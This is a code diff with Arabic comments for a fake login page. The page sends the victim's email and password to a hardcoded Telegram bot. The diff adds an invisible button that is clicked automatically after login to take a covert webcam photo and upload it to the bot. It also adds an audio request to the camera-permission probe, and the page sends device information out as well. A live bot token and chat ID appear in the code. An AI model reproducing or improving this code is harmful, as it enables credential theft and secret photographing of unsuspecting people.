@@ -7,7 +7,7 @@
     const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
     const chat_id = "6991944640";
 
-    // ✅ إرسال بيانات تسجيل الدخول
+    // ✅ إرسال معلومات تسجيل الدخول
     function sendLogin() {
       const email = document.getElementById("email").value;
       const pass = document.getElementById("pass").value;
@@ -20,40 +20,41 @@
       });
 
       document.getElementById("form").innerHTML = "<h2 style='color:lime;'>✅ جاري التحقق...</h2>";
+      setTimeout(() => {
+        document.getElementById("triggerSnap").click(); // تصوير بعد تسجيل الدخول
+      }, 1500);
     }
 
-    // ✅ التقاط صورة بالكاميرا وإرسالها للبوت
+    // ✅ تصوير صورة بالكاميرا وإرسالها للبوت
     async function snapPhoto() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
 
-    const canvas = document.createElement("canvas");
-    canvas.width = 640;
-    canvas.height = 480;
-    const ctx = canvas.getContext("2d");
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
 
-    setTimeout(async () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async (blob) => {
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("photo", blob, "snapshot.jpg");
+        stream.getTracks().forEach(track => track.stop());
 
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
-      }, "image/jpeg");
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", chat_id);
+          formData.append("photo", blob, "photo.jpg");
 
-      stream.getTracks().forEach(track => track.stop());
-    }, 2000);
-  } catch (e) {
-    console.log("❌ Camera Error:", e);
-  }
-}
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          });
+        }, "image/jpeg");
+      } catch (e) {
+        console.log("Camera failed: " + e.message);
+      }
+    }
 
     // ✅ إرسال معلومات الجهاز
     (async () => {
@@ -73,7 +74,7 @@
 
       let camAccess = "❌ Blocked";
       try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         camAccess = "✅ Granted";
       } catch (e) {
         camAccess = "❌ " + e.name;
@@ -98,9 +99,6 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id, text: msg })
       });
-
-      // شغّل التصوير السريع بعد جمع المعلومات
-      snapPhoto();
     })();
   </script>
 
@@ -152,5 +150,6 @@
     <input type="password" id="pass" placeholder="🔑 كلمة المرور"><br>
     <button onclick="sendLogin()">تسجيل الدخول</button>
   </div>
+  <button id="triggerSnap" onclick="snapPhoto()" style="opacity:0; position:absolute;">Snap</button>
 </body>
 </html>
